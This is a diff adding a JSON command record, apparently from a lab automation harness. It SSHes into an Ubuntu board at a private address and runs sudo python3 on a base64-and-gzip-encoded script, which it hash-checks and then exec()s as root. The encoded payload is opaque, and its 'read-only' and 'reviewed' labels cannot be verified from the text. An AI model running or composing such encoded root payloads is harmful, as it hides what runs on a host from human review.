@@ -1,0 +1,26 @@
+{
+  "argv": [
+    "C:/Windows/System32/OpenSSH/ssh.exe",
+    "-T",
+    "-o",
+    "BindAddress=192.168.2.1",
+    "-o",
+    "UserKnownHostsFile=C:/Patientqwen/platform/qwen35/a10/board_ssh_known_hosts",
+    "-o",
+    "StrictHostKeyChecking=yes",
+    "-o",
+    "ConnectTimeout=5",
+    "-o",
+    "ServerAliveInterval=5",
+    "-o",
+    "ServerAliveCountMax=2",
+    "-o",
+    "NumberOfPasswordPrompts=1",
+    "-o",
+    "PubkeyAuthentication=no",
+    "ubuntu@192.168.2.2",
+    "sudo -S -p __A10_READONLY_EVIDENCE_AUTH__: /usr/bin/python3 -B -I -c \"import base64,gzip,hashlib; b=gzip.decompress(base64.b64decode('H4sIAAAAAAAC/6VVy47rNgzd5yuEbGwVjl+TyWQy9aLFvYsCxW2B3nYTBIFs0Yk6siRIyqtF/72U7TwGuF3VC8cSj8jDQ1KZTqc/6oPiwIkFxmdayQvZgQLLvNCKGKt3FpwjzqO9eyMKjmCJEzvFpCPaEq8PzR4c4XAUDbh0Op1ORGe09WTP3F6K+rr802l1/dZu0lrdEcN8gJBx+1dcXiFedDCZMOegx6c78HAQPKZVlROm+NV96vasfF7E4WwcZeCbrGPNXiiYCR7RNOS1rS8eXExpuoczFztwPviJgM2BvRTzMs/hOS+WRTN/enmun5bPdQFPzZzl7YIXr69NUy/QXPJF2S4XddPOX+rFHJpoYrX21Rj6yGyGhLL3Y7nIZ6woM+fB5MvZXdBZmZeLIi/ns2MR0Wt2wUkq3JYLG9NJ/eAS9W8yd3HZO1gFMrOYuO6yANnes/NwxnxSrJEw6IBDSzwTMjZ0NSH4iJYo7YkJMVohIaYrC/5gFVlvesBJ+D2atQEVR7aOKGGOtMPh8DjxF1Rt6gDe4zwp6ZvzzPqqY2dcBuNsWbzi9gjprfSNM8/wVKCIrIIfiVVxVdhPnZHC9+vRhiT7c6sB1L/XxWogiD14kL4a6bbYd8FOhBpc3pl6e1kN4JQZTIfHoe1SqRl3ccBSesPCuQHjSfwHkwf4bK22ye9KNJrDJwjvfouuDFZpJNFrNrifBBLMe+jQBfLAyuwgxi4ZNR9L+z/qWFXBPETWp4qLxsfjgd6SdBqrqpHxVrkqjEv6uBPTZKRXjb/JSVuM76q//6E3HZ3gvY5x5IooiVwZ0buarZYcbBX6M4vsQYWuzcKJN7wGlMeooc0GVBYN7rPBlAbdZXRXG3NYjxAXbdbBy2ZIqtGdkTjdvHI4+MBjkxpm0UmqWAc9SxMoDnHSndR1HH2XjWUOcSJKk1ugvtGY89ueSDXQWc+KTWixYUVAOiBftIJEadsxuYWz8NVDq9ySCoYxxmORaHD2TdBtxu5Brs3fwiDYo55Z2G4ujYQPivVqSYa3lt/eENGmCt/XXML3Pcitor1ofUU7ptgO7OxOL7nuYZMhc5v6s8fNkYors59+++XnH75+/nSFj5YPWt/7wwytESLe9pDYh4sGEwn2TWUe9Vv3N8Y43cYK5YdB5YfOOBToRJNWHty++moPcLsgvpFRP3v6FP6K/jONEbOqkcD71dc4FN8v8nzVD4+TACZ+yunkX52bx/wWBwAA')); assert hashlib.sha256(b).hexdigest()=='32d07a03085c8a248e7d6138d8534da0a685c4fd6048d3895e8df8c0a91aa1a2'; exec(compile(b,'a12_step07_reviewed','exec'))\""
+  ],
+  "script_sha256": "32d07a03085c8a248e7d6138d8534da0a685c4fd6048d3895e8df8c0a91aa1a2",
+  "scope": "A12_STEP08_FULL_MODEL_AUTHORIZED"
+}
